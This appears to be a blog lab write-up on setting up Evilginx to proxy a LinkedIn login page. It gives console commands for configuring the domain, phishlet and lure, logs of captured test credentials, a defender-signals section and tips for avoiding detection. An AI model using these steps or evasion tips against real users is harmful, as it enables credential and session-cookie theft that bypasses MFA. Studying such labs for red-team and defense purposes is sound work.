---
title: "Evilginx: Setting Up a Phishing Framework from Scratch"
date: "2025-10-15"
description: "A full walkthrough of building an Evilginx lab — VPS, domain, DNS, phishlets, lures, and what actually happens when you turn it on."
tags: ["red-team", "phishing", "evilginx", "lab"]
---

## What This Is

This is a documentation of a lab project I built to understand how modern phishing infrastructure works at a technical level. Not a tutorial for attacking real people — a breakdown of the components, how they connect, and what defenders actually see on the other side.

Evilginx is a man-in-the-middle phishing framework. Unlike traditional phishing that just clones a login page, Evilginx acts as a reverse proxy — it sits between the victim and the real website, relays everything in real time, and captures session cookies along with credentials. That means it bypasses MFA. That's what makes it worth understanding from both a red team and a blue team perspective.

---

## Lab Environment

| Component | What I Used |
|---|---|
| VPS | DigitalOcean Droplet (Ubuntu) |
| Domain | Free domain via digitalplats |
| DNS Management | Cloudflare |
| Email (optional) | Zoho |
| Framework | Evilginx 3.3.0 Community Edition |
| Phishlet | LinkedIn |

---

## Setup Walkthrough

### 1. VPS and Evilginx Installation

Spun up a DigitalOcean droplet and installed Evilginx. The framework runs as a local binary — you point it at a phishlets directory and it handles TLS certificates automatically via Let's Encrypt.

```bash
./build/evilginx -p phishlets/
```

On first run you get the banner and an empty phishlet table:

```
+-----------+-----------+-------------+-----------+-------------+
| phishlet  |  status   | visibility  | hostname  | unauth_url  |
+-----------+-----------+-------------+-----------+-------------+
| linkedin  | disabled  | visible     |           |             |
+-----------+-----------+-------------+-----------+-------------+
```

### 2. Domain and DNS

Registered a free domain and pointed it to the VPS IP. The domain I used was `sinosomtechnology.qzz.io`.

DNS is managed through Cloudflare. Evilginx requires A records for each phishlet subdomain pointing to the VPS. Without the correct DNS records, the TLS certificate provisioning fails and phishlets won't enable.

The Cloudflare setup:
- Root domain → VPS IP
- Phishlet subdomain (www) → VPS IP
- Proxy status: DNS only, not proxied (Cloudflare proxying breaks Evilginx TLS)

### 3. Configuring Evilginx

Inside the Evilginx console:

```
: config domain sinosomtechnology.qzz.io
[inf] server domain set to: sinosomtechnology.qzz.io

: phishlets hostname linkedin sinosomtechnology.qzz.io
[inf] phishlet 'linkedin' hostname set to: sinosomtechnology.qzz.io
```

### 4. Enabling the Phishlet

```
: phishlets enable linkedin
[inf] enabled phishlet 'linkedin'
[inf] obtaining and setting up 1 TLS certificates - please wait up to 60 seconds...
[inf] successfully set up all TLS certificates
```

![Phishlets enabled in Evilginx console](/blog/evilginx/enable-phishlets.png)

At this point the phishlet is live and serving a proxied LinkedIn login page over HTTPS with a valid certificate.

### 5. What Happened Immediately After Enabling

This is where it gets interesting. Within seconds of enabling the phishlet, the logs started filling up:

```
[war] [linkedin] unauthorized request: https://www.sinosomtechnology.qzz.io/ () [157.245.36.108]
[war] blacklisted ip address: 157.245.36.108
[war] blacklist: request from ip address '157.245.36.108' was blocked
[war] blacklist: request from ip address '157.245.36.108' was blocked
... (20+ blocked requests from the same IP)
```

Then more IPs followed — iPhone user agents, different subnets, all hitting within minutes:

```
[war] [linkedin] unauthorized request: https://www.sinosomtechnology.qzz.io/ 
(Mozilla/5.0 (iPhone; CPU iPhone OS 18_5...)) [206.204.40.59]
[war] blacklisted ip address: 206.204.40.59
```

**What is this?** These are automated scanners — likely a mix of LinkedIn's own infrastructure scanning newly-registered domains that match their brand name, security vendors crawling suspicious domains, and general internet noise. The domain contained the word "linkedin" which immediately triggered detection systems.

This is the part most phishing tutorials skip. The moment your infrastructure goes live, it is being scanned. From a blue team perspective, this is exactly the signal defenders look for — a new domain matching a known brand's name with a fresh TLS certificate and no history.

### 6. DNS Records for Phishlet Subdomains

![DNS A records added in Cloudflare](/blog/evilginx/add-sub-domain-to-dns.png)

### 7. WordPress Lure Page

For the lure redirect I set up a WordPress-looking login page as the landing. When someone hits the lure URL without the correct token they see this generic page instead of the phishlet directly.

![WordPress-style landing page](/blog/evilginx/landing-page.png)

### 8. Creating the Lure

```
: lures create linkedin
[inf] created lure with ID: 0

: lures get-url 0
https://www.sinosomtechnology.qzz.io/hiZKQhKJ
```

The lure URL contains a unique path token. Only requests hitting that exact path get proxied to LinkedIn. Everything else gets an unauthorized response — which is what caused all those blacklist entries above.

### 9. Delivering and Testing

The lure URL was sent via a test phishing email in the lab environment:

![Phishing email used in the lab](/blog/evilginx/phishing-email.png)

When the test user clicked the link, Evilginx logged the arrival:

```
[imp] [0] [linkedin] new visitor has arrived: 
Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0.0.0 (192.145.174.194)
[inf] [0] [linkedin] landing URL: https://www.sinosomtechnology.qzz.io/hiZKQhKJ
```

The test user submitted credentials:

![Test user submitting credentials](/blog/evilginx/victim-add-creds.png)

And Evilginx captured them:

```
[+++] [0] Username: [wow]
[+++] [0] Password: [password]
```

![Captured credentials in Evilginx console](/blog/evilginx/getting-victim-creds.png)

---

## What a Defender Would See

From the blue team side, this attack produces several detectable signals:

**DNS layer** — a newly registered domain containing a known brand name with no history. Tools like Cisco Umbrella, Cloudflare Gateway, and enterprise DNS filters flag this pattern automatically.

**Certificate transparency logs** — every TLS certificate is logged publicly. Defenders monitoring CT logs for brand-matching domains (using tools like CertStream) would catch this domain the moment the certificate was issued — before any phishing email was even sent.

**Email headers** — the phishing email would fail SPF/DKIM checks unless the attacker also set up proper email infrastructure on the same domain. A mail gateway doing header analysis would catch it.

**Behavioral** — the MFA bypass via session cookie theft is harder to detect at the network layer but shows up as an impossible travel or new device login event in the identity provider logs.

---

## What I Took From This

The interesting part of this lab wasn't capturing credentials — that part is almost mechanical once the infrastructure is up. The interesting part was watching how quickly automated systems responded to the domain going live. No human reported it. No one clicked anything. The domain name alone was enough to trigger scanning within seconds.

That tells you something about how defender tooling works at scale, and it tells you something about what makes phishing infrastructure harder to detect — using aged domains, avoiding brand-name keywords, and keeping infrastructure quiet before use.

Understanding that as a red teamer makes you better. Understanding it as a blue teamer tells you exactly what to monitor.